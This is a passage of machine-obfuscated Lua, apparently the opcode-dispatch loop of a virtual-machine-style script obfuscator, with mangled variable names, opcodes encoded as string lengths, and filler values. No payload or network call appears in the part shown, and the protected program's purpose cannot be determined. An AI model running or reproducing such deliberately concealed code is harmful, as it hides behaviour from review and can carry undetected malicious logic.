ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("G9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("PHd")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("6x05")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{616;878;57;518};"1 + 1 = 111";}]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("e74")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("hro")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("0JGm")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sf")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jMZ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("rIk")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("2UdR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("o0")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("B1s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("On")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{956;102;520;230};"1 + 1 = 111";{545;844;502;739};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UNr1")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gC")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ltj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("BEQ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("U32A")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cy")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P9B")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("n5")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("mQ3u")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VV")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Vpn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{692;292;174;613};"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("umTZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("N0")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fk9")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("odT")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("8Shp")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NM")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("qUG")]~=0);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("iOH")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("5SV")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("9TJDiogNDoa8GllWTQTSb08KFujLDcGnqbkuxNHIoomKOM05")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("aT")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]+ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIllIIIl;if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl<=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("gf7")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl>=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("I1o")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end else local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("9A")];ajefa_IlIIIlIIIIlIIlllI=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dLW")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IlIIIlIIIIlIIlllI;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IlIIIlIIIIlIIlllI[ajefa_lllIIlIllIlIllllIIlIIlll[#("aGZJ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("io")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3d")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("cvf")]~=0);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zE")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("E22")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("d5")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("pNY")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("bEr")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pU")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ab")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("TIj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ty")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("f8R")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ua")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nfo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("mlJV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZaU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("zoZF")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("QztAUCjV97XeGkBSWREb1zgjkDXOy53FoBWNmYGKaKxPTDTeW114")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("3srskorOFxder0eyXG8l4arbBASTT2He8juhFubJn5FmsLCMPQ")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xn")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("7kW")]],nil,ajefa_IlIIllIIIl);elseif ajefa_IIIlIllIllllIIllIlllIIll==#("v3SB2bp2VHI5N09fiF63DEz78FeS08fec3kkqSCfoDqcQa1xtFs")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("UW")];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl>ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Irl")];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl<ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{511;147;567;140};"1 + 1 = 111";{731;233;331;312};}];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hv")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qt3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("dFAJ")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("SWG1EVDy7HcXBE2UPYZAd0O9nvr8NRzuP8xpxsRFpeiRBDMlhhRFP")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DT")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{150;331;134;591};{297;456;337;826};}]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("d1iGOhDEUpiRhCgMxxhtk8S6JUUf0Ga4PW4Gh1PJcVu2JTvjfGUuxv")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yu")]]<ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kQl1")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Bip")];end;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{23;935;574;50};{77;559;887;578};}];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("fil63xxNopncvILEGRJrzOZyZzLauVPItdZx64WlPhgNvR9LEboNYdsCtYgEW")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("rDKQSrSoIL5xMqHmbiA9HtGbUpVychXsAsZNcP8S3oDOSBCb4hW8eWZ87I")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("DHulBYN7tB4jvjRgr12ssYTD5vYnOD1QFTGlIdcZfEiLa7AZxPIgeoNP")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OFW")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Pbo9")]];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("1pe9zt0KnPNNGIoZcnZQiD859185VLpf1yRX70RkraWsXl0hsrbbY9Pyr")then do return end;else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Bm")]local ajefa_lIIllIlIIlllII,ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_llIIllIIIIlI(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1]))ajefa_lIIIIIlIllIlllllllIIll=ajefa_IlIIIlIllIlIlllIlIlIllll+ajefa_lllIIlIllIlIllllIIlIIlll-1 local ajefa_IlIIIlIllIlIlllIlIlIllll=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIIIIIlIllIlllllllIIll do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("aHu5YNAHWi1C1mGPyhRPiXb1MDJnr2SsFX0jZxmi3pARp1BZGjLIRNbmGEs")then local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("fK")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll]=ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("2iQ")]))elseif ajefa_IIIlIllIllllIIllIlllIIll>#("dlo3BI6dxvZb5JW2ytLVcUSirjM2WNOud0eSaHpS5xCjtJNi0iYm3IttDgMq")then if not ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bp")]]then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SFK")];end;else local ajefa_lIIIllIlIIIIIllIlII;local ajefa_lIIIIIlIllIlllllllIIll;local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{727;114;813;742};"1 + 1 = 111";}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vhY")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bFbn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sY")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5ni")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zL")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("mkX")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7t")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("boo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ndsJ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("DS")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4Ri")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bghl")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Z7")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kv")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("pYz")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{281;496;636;377};}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xXL")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gyoR")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BO")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ocv")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("nS")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Fs")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tti")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DsJa")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("sT")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Oj")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Iil")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("t8")]]=#ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sen")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8e")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("305")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("H8")];ajefa_lIIIIIlIllIlllllllIIll=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]ajefa_lIIIllIlIIIIIllIlII=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+2];if(ajefa_lIIIllIlIIIIIllIlII>0)then if(ajefa_lIIIIIlIllIlllllllIIll>ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{467;845;921;829};"1 + 1 = 111";}];else ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+3]=ajefa_lIIIIIlIllIlllllllIIll;end elseif(ajefa_lIIIIIlIllIlllllllIIll<ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SEI")];else ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+3]=ajefa_lIIIIIlIllIlllllllIIll;end end;elseif 